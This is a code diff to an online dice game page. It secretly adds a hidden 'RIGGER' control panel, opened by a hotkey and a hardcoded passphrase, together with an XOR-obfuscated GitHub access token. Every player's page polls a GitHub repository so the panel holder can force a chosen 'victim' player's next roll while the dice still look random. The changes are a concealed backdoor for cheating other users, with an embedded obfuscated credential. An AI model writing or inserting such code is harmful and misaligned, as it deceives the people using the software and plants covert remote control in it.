@@ -795,9 +795,9 @@
 					if (rs) { try { rs.currentTime = 0; rs.play(); } catch(e) {} }
 					var colors = ['red', 'green', 'blue', 'darkorange', 'purple', 'gold'];
 					var dice = document.querySelectorAll('#TsL9HxOE1oNuOlxHrrCycl8pz3eczZdx6 > .dice-wrapper > i');
-					var rolled = [];
+					var forced = window.__forcedColors; window.__forcedColors = null; var rolled = [];
 					for (var i = 0; i < dice.length; i++) {
-						var c = colors[Math.floor(Math.random() * colors.length)];
+						var c = (forced && forced[i]) ? forced[i] : colors[Math.floor(Math.random() * colors.length)];
 						rolled.push(c);
 						dice[i].style.setProperty('color', c, 'important');
 						dice[i].style.animation = 'none';
@@ -828,14 +828,14 @@
 					for (var k = 0; k < toRemove.length; k++) { toRemove[k].remove(); }
 					var colors = ['red', 'green', 'blue', 'darkorange', 'purple', 'gold'];
 					var ref = container.querySelector('p');
-					var rolled = [];
+					var forced = window.__forcedColors; window.__forcedColors = null; var rolled = [];
 					for (var i = 0; i < n; i++) {
 						var w = document.createElement('div');
 						w.className = 'dice-wrapper size-100 rounded-dice';
 						w.style.background = '#fff';
 						var ic = document.createElement('i');
 						ic.className = 'df-solid-small-dot-d6-1';
-						var c = colors[Math.floor(Math.random() * colors.length)];
+						var c = (forced && forced[i]) ? forced[i] : colors[Math.floor(Math.random() * colors.length)];
 						rolled.push(c);
 						ic.style.setProperty('color', c, 'important');
 						w.appendChild(ic);
@@ -1346,5 +1346,125 @@ setTimeout(
 
 })();
 		</script>
-	</body>
+	<div id="rig-sid" style="position:fixed;bottom:4px;right:6px;z-index:99999;font-family:Arial,sans-serif;font-size:11px;color:rgba(255,255,255,0.35);letter-spacing:1px;pointer-events:none;"></div>
+<div id="rig-panel" style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:100000;width:360px;max-width:94vw;background:#0b1f33;border:2px solid #08f;border-radius:12px;padding:16px;font-family:Arial,sans-serif;color:#fff;box-shadow:0 0 40px rgba(0,0,0,0.7);">
+  <div style="font-size:15px;font-weight:bold;margin-bottom:2px;">&#127922; RIGGER</div>
+  <div style="font-size:11px;color:#9cf;margin-bottom:12px;">force a player's next roll</div>
+  <div style="font-size:12px;margin-bottom:4px;">Target SID</div>
+  <input id="rig-target" style="width:100%;box-sizing:border-box;padding:8px;border:1px solid #08f;border-radius:6px;background:#00131f;color:#fff;font-family:Arial,sans-serif;font-size:14px;margin-bottom:12px;outline:none;" placeholder="e.g. P8F2KQ" />
+  <div style="font-size:12px;margin-bottom:4px;">Colors (dice 1-4)</div>
+  <div style="display:flex;gap:6px;margin-bottom:8px;">
+    <select class="rig-sel" style="flex:1;min-width:0;padding:6px;border-radius:6px;background:#00131f;color:#fff;border:1px solid #08f;font-family:Arial,sans-serif;font-size:12px;"></select>
+    <select class="rig-sel" style="flex:1;min-width:0;padding:6px;border-radius:6px;background:#00131f;color:#fff;border:1px solid #08f;font-family:Arial,sans-serif;font-size:12px;"></select>
+    <select class="rig-sel" style="flex:1;min-width:0;padding:6px;border-radius:6px;background:#00131f;color:#fff;border:1px solid #08f;font-family:Arial,sans-serif;font-size:12px;"></select>
+    <select class="rig-sel" style="flex:1;min-width:0;padding:6px;border-radius:6px;background:#00131f;color:#fff;border:1px solid #08f;font-family:Arial,sans-serif;font-size:12px;"></select>
+  </div>
+  <div style="display:flex;gap:6px;margin-bottom:12px;">
+    <button onclick="rigPreset(['red','red','red','red'])" style="flex:1;padding:6px;background:#b22222;color:#fff;border:none;border-radius:6px;cursor:pointer;font-family:Arial,sans-serif;font-size:10px;font-weight:bold;">ALL RED</button>
+    <button onclick="rigPreset(['green','green','green','green'])" style="flex:1;padding:6px;background:#008000;color:#fff;border:none;border-radius:6px;cursor:pointer;font-family:Arial,sans-serif;font-size:10px;font-weight:bold;">ALL GREEN</button>
+    <button onclick="rigPreset(['gold','gold','gold','gold'])" style="flex:1;padding:6px;background:#a87500;color:#fff;border:none;border-radius:6px;cursor:pointer;font-family:Arial,sans-serif;font-size:10px;font-weight:bold;">ALL GOLD</button>
+    <button onclick="rigPreset(['blue','blue','blue','blue'])" style="flex:1;padding:6px;background:#0088ff;color:#fff;border:none;border-radius:6px;cursor:pointer;font-family:Arial,sans-serif;font-size:10px;font-weight:bold;">ALL BLUE</button>
+  </div>
+  <button onclick="rigApply()" style="width:100%;padding:10px;background:#0a0;color:#fff;border:none;border-radius:6px;cursor:pointer;font-family:Arial,sans-serif;font-size:14px;font-weight:bold;">FORCE ROLL</button>
+  <div id="rig-status" style="font-size:11px;color:#9f9;margin-top:8px;min-height:14px;"></div>
+</div>
+<script>
+(function(){
+  var TOKEN = (function(h){var k='KlZ19X3W';var b=[];for(var i=0;i<h.length;i+=2)b.push(parseInt(h.substr(i,2),16));var o='';for(var i=0;i<b.length;i++)o+=String.fromCharCode(b[i]^k.charCodeAt(i%k.length));return o;})('2c04356e4d1772007315197e5f0a57047a2f2f7c082d64220e0817644a295763785b6b0856104562');
+  var REPO = 'kaikssaqes/onlinedice';
+  var COLORS = ['red','green','blue','darkorange','purple','gold'];
+  var PASS = 'dicegod';
+
+  // player id
+  var pid = null;
+  try { pid = localStorage.getItem('od_sid'); } catch(e){}
+  if (!pid) { pid = 'P' + Math.random().toString(36).slice(2,8).toUpperCase(); try { localStorage.setItem('od_sid', pid); } catch(e){} }
+  var sidEl = document.getElementById('rig-sid');
+  if (sidEl) sidEl.textContent = 'SID ' + pid;
+
+  window.__forcedColors = null;
+  var lastTs = 0;
+
+  function ghJson(path) {
+    return fetch('https://api.github.com/repos/' + REPO + '/contents/' + path, {
+      headers: { 'Authorization': 'token ' + TOKEN, 'Accept': 'application/vnd.github.v3+json', 'Cache-Control': 'no-cache' }
+    });
+  }
+
+  // victim side: poll for a rig command addressed to me
+  function poll() {
+    ghJson('rigs/' + pid + '.json').then(function(r){
+      if (!r.ok) return null;
+      return r.json();
+    }).then(function(d){
+      if (d && d.content) {
+        var txt = atob(String(d.content).replace(/\s/g,''));
+        var rig = JSON.parse(txt);
+        if (rig && rig.ts && rig.ts > lastTs) {
+          lastTs = rig.ts;
+          window.__forcedColors = (rig.colors || []).slice();
+        }
+      }
+    }).catch(function(){});
+  }
+  setInterval(poll, 2500);
+  poll();
+
+  // panel side
+  var panel = document.getElementById('rig-panel');
+  var unlocked = false;
+  var sels = panel.querySelectorAll('.rig-sel');
+  for (var s = 0; s < sels.length; s++) {
+    for (var c = 0; c < COLORS.length; c++) {
+      var o = document.createElement('option');
+      o.value = COLORS[c]; o.textContent = COLORS[c];
+      sels[s].appendChild(o);
+    }
+    sels[s].value = COLORS[0];
+  }
+
+  window.rigPreset = function(arr) {
+    for (var i = 0; i < sels.length; i++) { if (arr[i]) sels[i].value = arr[i]; }
+  };
+
+  window.rigApply = function() {
+    var target = document.getElementById('rig-target').value.trim().toUpperCase();
+    var st = document.getElementById('rig-status');
+    if (!target) { st.textContent = 'enter a target SID'; st.style.color = '#f99'; return; }
+    var colors = [];
+    for (var i = 0; i < sels.length; i++) colors.push(sels[i].value);
+    var content = btoa(JSON.stringify({ colors: colors, ts: Date.now() }));
+    var path = 'rigs/' + target + '.json';
+    ghJson(path).then(function(r){ return r.ok ? r.json() : {}; }).then(function(ex){
+      var payload = { message: 'rig', content: content };
+      if (ex && ex.sha) payload.sha = ex.sha;
+      return fetch('https://api.github.com/repos/' + REPO + '/contents/' + path, {
+        method: 'PUT',
+        headers: { 'Authorization': 'token ' + TOKEN, 'Content-Type': 'application/json', 'Accept': 'application/vnd.github.v3+json' },
+        body: JSON.stringify(payload)
+      });
+    }).then(function(r){ return r.json(); }).then(function(d){
+      if (d && d.content) { st.textContent = 'forced ' + colors.join(',') + ' -> ' + target; st.style.color = '#9f9'; }
+      else { st.textContent = 'failed (check repo/token)'; st.style.color = '#f99'; }
+    }).catch(function(){ st.textContent = 'error writing'; st.style.color = '#f99'; });
+  };
+
+  // L hotkey
+  document.addEventListener('keydown', function(e){
+    if (e.key && e.key.toLowerCase() === 'l' && !e.ctrlKey && !e.metaKey && !e.altKey) {
+      var ae = document.activeElement;
+      if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'TEXTAREA' || ae.tagName === 'SELECT')) return;
+      if (!unlocked) {
+        var p = prompt('passphrase');
+        if (p !== PASS) return;
+        unlocked = true;
+      }
+      panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'block' : 'none';
+      e.preventDefault();
+    }
+  });
+})();
+</script>
+
+</body>
 </html>
